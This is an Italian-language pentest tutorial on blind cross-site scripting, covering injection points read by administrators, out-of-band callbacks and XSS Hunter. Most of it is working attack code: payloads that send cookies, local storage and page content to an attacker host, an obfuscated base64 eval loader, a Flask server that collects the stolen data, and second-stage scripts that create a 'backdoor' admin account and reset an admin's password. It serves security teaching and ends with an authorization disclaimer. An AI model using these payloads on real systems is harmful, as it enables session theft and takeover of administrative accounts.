---
title: 'Blind XSS: cos''è e come scoprirlo con callback out-of-band e XSS Hunter'
slug: blind-xss
description: >-
  Guida completa al Blind XSS: detection out-of-band, callback server, XSS
  Hunter, payload invisibili, punti di iniezione admin e analisi dei trigger
  lato pannelli interni.
image: /blind-xss.webp
draft: false
date: 2026-03-28T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - xss
  - xss-hunter
---

**Blind XSS** è la variante più subdola del Cross-Site Scripting: il payload viene eseguito in un contesto che non vedi mai direttamente. Nessun alert box, nessuna response visibile. Il codice si attiva quando qualcun altro — tipicamente un admin o un operatore — apre la pagina che contiene il tuo payload.

Negli assessment web professionali, Blind XSS colpisce bersagli di alto valore: pannelli admin, sistemi di log, dashboard analytics, tool interni di gestione. Il ritardo tra iniezione ed esecuzione può essere di ore, giorni o settimane.

→ Torna alla guida principale: [XSS Completo](https://hackita.it/articoli/xss)

***

## Dove si Nasconde Blind XSS

Non puoi vedere l'output → devi pensare a chi lo vede al posto tuo.

| Campo Iniettato                 | Visto da                 | Quando                 |
| ------------------------------- | ------------------------ | ---------------------- |
| Ticket di supporto              | Agente helpdesk          | Alla gestione ticket   |
| Form "Contattaci"               | Admin, team support      | All'apertura messaggio |
| Username / Display name         | Admin user list          | Alla gestione utenti   |
| User-Agent HTTP header          | Admin nei log di accesso | Alla lettura log       |
| Referer header                  | Sistema analytics        | Alla lettura dati      |
| Commento / review (moderazione) | Moderatore               | Alla revisione         |
| Nome file upload                | Admin file manager       | All'ispezione file     |
| Campo note interno              | Operatore CRM            | All'apertura record    |
| Error message log               | Sviluppatore / SRE       | Al debug               |

La chiave: inietta in **ogni** campo che potenzialmente viene letto da qualcuno con privilegi maggiori dei tuoi.

***

## Il Problema Fondamentale: Non Sai se Funziona

Con reflected e stored XSS vedi immediatamente l'esecuzione. Con Blind XSS hai bisogno di un meccanismo out-of-band: il payload deve "telefonarti a casa" quando viene eseguito.

Questo richiede:

1. Un server raggiungibile da internet
2. Un payload che fa una richiesta a quel server quando eseguito
3. Un modo per correlare la richiesta all'iniezione specifica

***

## Payload Blind XSS Base

### Fetch Callback

```javascript
<script>
fetch('https://ATTACKER.com/blind?id=form_contatto&url=' + 
    encodeURIComponent(location.href) + 
    '&c=' + encodeURIComponent(document.cookie),
    {mode: 'no-cors'}
);
</script>
```

Il parametro `id=form_contatto` ti dice quale campo ha triggherato il callback — utile quando inietti in decine di punti diversi.

### Payload Completo con Screenshot DOM

```javascript
<script src="https://ATTACKER.com/payload.js"></script>
```

Nel file `payload.js` sul tuo server:

```javascript
(function() {
    var data = {
        id: document.location.href,
        cookies: document.cookie,
        localStorage: JSON.stringify(Object.assign({}, localStorage)),
        sessionStorage: JSON.stringify(Object.assign({}, sessionStorage)),
        dom: document.documentElement.outerHTML.substring(0, 10000),
        title: document.title,
        referrer: document.referrer,
        ts: new Date().toISOString()
    };
    
    fetch('https://ATTACKER.com/callback', {
        method: 'POST',
        mode: 'no-cors',
        headers: {'Content-Type': 'text/plain'},
        body: JSON.stringify(data)
    });
})();
```

Servire il payload da file JS esterno ha vantaggi: puoi modificare l'azione post-trigger senza re-iniettare.

***

## Server di Ricezione: Setup Pratico

### Python Flask Minimale

```python
from flask import Flask, request
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/blind')
def blind_get():
    print(f"\n[!] Blind XSS Callback - {datetime.now()}")
    print(f"    URL vittima: {request.args.get('url', 'N/A')}")
    print(f"    Cookie: {request.args.get('c', 'N/A')}")
    print(f"    Form: {request.args.get('id', 'N/A')}")
    return 'OK', 200

@app.route('/callback', methods=['POST'])
def callback_post():
    data = request.get_data(as_text=True)
    filename = f"blind_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(f'callbacks/{filename}', 'w') as f:
        f.write(data)
    print(f"\n[!] Callback ricevuto → {filename}")
    return 'OK', 200

@app.route('/payload.js')
def serve_payload():
    js = """
(function() {
    var d = {
        url: location.href,
        cookies: document.cookie,
        dom: document.body.innerHTML.substring(0, 8000),
        title: document.title,
        ts: Date.now()
    };
    fetch('https://ATTACKER.com/callback', {
        method: 'POST', mode: 'no-cors',
        body: JSON.stringify(d)
    });
})();
"""
    return js, 200, {'Content-Type': 'application/javascript',
                     'Access-Control-Allow-Origin': '*'}

if __name__ == '__main__':
    import os
    os.makedirs('callbacks', exist_ok=True)
    app.run(host='0.0.0.0', port=80)
```

Deploy su un VPS con IP pubblico e dominio (o ngrok per test veloci).

### ngrok per Test Rapidi (senza VPS)

```bash
# Avvia server locale
python3 blind_server.py

# In un altro terminale, esponi con ngrok
ngrok http 80

# ngrok ti fornisce un URL pubblico tipo:
# https://abc123.ngrok.io
# Usa quello nei payload
```

***

## XSS Hunter: Tool Dedicato

[XSS Hunter](https://xsshunter.com) è lo standard de facto per blind XSS in bug bounty e pentest. Fornisce:

* URL di callback univoco per ogni account
* Screenshot automatico della pagina che esegue il payload
* Cattura automatica di cookie, localStorage, DOM
* Email di notifica al trigger
* Tracking di tutti i trigger con timestamp

### Setup

1. Registra account su xsshunter.com
2. Ottieni il tuo subdomain: `tuo-nome.xss.ht`
3. Usa il payload universale:

```javascript
"><script src=//tuo-nome.xss.ht></script>
```

o versioni alternative per diversi contesti:

```javascript
// Se il filtro blocca <script>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vdHVvLW5vbWUueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>

// In attributo
" onload="var s=document.createElement('script');s.src='//tuo-nome.xss.ht';document.head.appendChild(s)
```

***

## Strategia di Iniezione Sistematica

In un pentest web professionale, il workflow per Blind XSS è:

### 1. Identifica tutti i form e i campi

Scrivi una lista di ogni punto di input testato: URL, nome campo, tipo (GET/POST), valore iniettato.

### 2. Payload con ID univoco per campo

```javascript
// Campo: form-contatto/nome
<script src="https://ATTACKER.com/p.js?id=form_contact_name"></script>

// Campo: form-registrazione/username
<script src="https://ATTACKER.com/p.js?id=reg_username"></script>

// Header User-Agent (in Burp, modifica la richiesta)
<script src="https://ATTACKER.com/p.js?id=ua_header"></script>
```

Il parametro `id` nel callback ti dice esattamente quale campo era vulnerable.

### 3. Monitora il server per 24-72 ore

I pannelli admin non vengono visitati ogni secondo. Aspetta. I callback possono arrivare ore dopo.

### 4. Analizza il DOM ricevuto

Quando ricevi il callback con il DOM dell'admin panel, analizza:

* Quali funzionalità sono disponibili?
* Ci sono token CSRF nel DOM?
* Quali API vengono chiamate?

Usa queste informazioni per costruire un payload di second stage più mirato.

***

## Payload per Header HTTP

Gli header HTTP come User-Agent e Referer finiscono spesso nei log delle applicazioni. Se quei log vengono visualizzati in un pannello admin senza encoding, hai blind XSS.

Intercetta la richiesta in Burp Suite e modifica gli header:

```http
GET / HTTP/1.1
Host: target.com
User-Agent: <script src="https://ATTACKER.com/p.js?id=ua"></script>
Referer: <script src="https://ATTACKER.com/p.js?id=ref"></script>
X-Forwarded-For: <script src="https://ATTACKER.com/p.js?id=xff"></script>
```

Includi il payload nell'header, non solo nel body.

***

## Escalation Post-Callback

Ricevi il callback con il DOM dell'admin panel. Ora cosa fai?

### Lettura Token CSRF

Dal DOM ricevuto estrai il CSRF token e costruisci un secondo payload che esegue azioni privilegiate:

```javascript
// Second stage: crea account admin
fetch('/admin/users/create', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json',
               'X-CSRF-Token': 'TOKEN_DAL_DOM'},
    body: JSON.stringify({
        username: 'backdoor', 
        password: 'BackdoorPass123!',
        role: 'admin'
    })
}).then(r => fetch('https://ATTACKER.com/done?s=' + r.status, {mode:'no-cors'}));
```

### Reset Password Admin

```javascript
// Forza reset password dell'admin corrente
fetch('/admin/account/password', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'new_password=Hacked1234!&confirm=Hacked1234!&csrf=' + csrf_token
});
```

***

## Documentazione nel Report

Nel pentest report, Blind XSS su admin panel va classificato come **Critico**. Includi:

* Punto di iniezione esatto
* Screenshot del DOM ricevuto (censura dati sensibili)
* Prova del callback (log del server con timestamp)
* Dimostrazione dell'impatto potenziale (senza exploitation effettiva su produzione)

***

*Disclaimer: Usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato penale (art. 615-ter c.p.).*
